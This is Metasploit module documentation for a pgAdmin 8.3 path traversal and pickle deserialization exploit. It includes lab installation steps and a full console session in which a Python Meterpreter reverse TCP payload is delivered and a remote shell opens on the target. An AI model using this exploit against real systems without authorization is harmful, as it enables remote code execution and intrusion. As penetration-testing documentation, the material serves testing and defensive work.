## Vulnerable Application
pgAdmin versions <= 8.3 have a path traversal vulnerability within their session management logic that can allow a
pickled file to be loaded from an arbitrary location. This can be used to load a malicious, serialized Python object to
execute code within the context of the target application.

This exploit supports two techniques by which the payload can be loaded, depending on whether or not credentials are
specified. If valid credentials are provided, Metasploit will login to pgAdmin and upload a payload object using
pgAdmin's file management plugin. Once uploaded, this payload is executed via the path traversal before being deleted
using the file management plugin. This technique works for both Linux and Windows targets. If no credentials are
provided, Metasploit will start an SMB server and attempt to trigger loading the payload via a UNC path. This technique
only works for Windows targets. For Windows 10 v1709 (Redstone 3) and later, it also requires that insecure outbound
guest access be enabled.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/multi/http/pgadmin_session_deserialization`
1. Set the `RHOST`, `PAYLOAD`, and optionally the `USERNAME` and `PASSWORD` options
1. Do: `run`

### Installation (Docker on Linux)

A docker instance can be started using the following command. It'll start on port 8080 with an initial account for
`metasploit@gmail.com`. Additional accounts can be created through the web UI.

```
docker run -p 8080:80 \
    -e 'PGADMIN_DEFAULT_EMAIL=metasploit@gmail.com' \
    -e 'PGADMIN_DEFAULT_PASSWORD=Password1!' \
    -d dpage/pgadmin4:8.3
```

### Installation (Windows)

These steps are the bare minimum to get the application to run for testing and should not be use for a production setup.
For a production setup, a server like Apache should be setup to run pgAdmin through it's WSGI interface.

**The following paths are all relative to the default installation path `C:\Program Files\pgAdmin 4\web`**.

1. [Download][1] and install the Windows build
1. Copy the `config_distro.py` file to `config_local.py`
1. Edit `config_local.py` and set `SERVER_MODE` to `True`
1. Upgrade pip:  `..\python\python.exe -m pip upgrade`
1. Install python package required by `setup.py`:  `..\python\python.exe -m pip install "psycopg[binary,pool]"`
1. Initialize the database: `..\python\python.exe setup.py setup-db`
1. Create an initial user account: `..\python\python.exe setup.py add-user --admin metasploit@gmail.com Password1!`
1. Run the application: `..\python\python.exe pgAdmin4.py`

## Scenarios
Specific demo of using the module that might be useful in a real world scenario.

### pgAdmin 8.3 on Docker

```
metasploit-framework (S:0 J:0) exploit(multi/http/pgadmin_session_deserialization) > set RHOSTS 192.168.250.134
RHOSTS => 192.168.250.134
metasploit-framework (S:0 J:0) exploit(multi/http/pgadmin_session_deserialization) > set RPORT 8080
RPORT => 8080
metasploit-framework (S:0 J:0) exploit(multi/http/pgadmin_session_deserialization) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
metasploit-framework (S:0 J:0) exploit(multi/http/pgadmin_session_deserialization) > set USERNAME user@gmail.com
USERNAME => user@gmail.com
metasploit-framework (S:0 J:0) exploit(multi/http/pgadmin_session_deserialization) > set PASSWORD Password1!
PASSWORD => Password1!
metasploit-framework (S:0 J:0) exploit(multi/http/pgadmin_session_deserialization) > set PAYLOAD python/meterpreter/reverse_tcp
PAYLOAD => python/meterpreter/reverse_tcp
metasploit-framework (S:0 J:0) exploit(multi/http/pgadmin_session_deserialization) > set LHOST 192.168.250.134
LHOST => 192.168.250.134
metasploit-framework (S:0 J:0) exploit(multi/http/pgadmin_session_deserialization) > run

[*] Started reverse TCP handler on 192.168.250.134:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. pgAdmin version 8.3.0 is affected
[*] Successfully authenticated to pgAdmin
[*] Serialized payload uploaded to: /var/lib/pgadmin/storage/zeroSteiner_gmail.com/reiciendis.pages
[*] Triggering deserialization for path: ../storage/zeroSteiner_gmail.com/reiciendis.pages
[*] Sending stage (24768 bytes) to 192.168.250.134
[*] Meterpreter session 1 opened (192.168.250.134:4444 -> 192.168.250.134:45930) at 2024-03-29 12:01:04 -0400

meterpreter > getuid
Server username: pgadmin
meterpreter > sysinfo
Computer     : 27b165126272
OS           : Linux 6.7.9-200.fc39.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Mar  6 19:35:04 UTC 2024
Architecture : x64
Meterpreter  : python/linux
meterpreter > pwd
/pgadmin4
meterpreter > 
```

[1]: https://www.postgresql.org/ftp/pgadmin/pgadmin4/v8.3/windows/
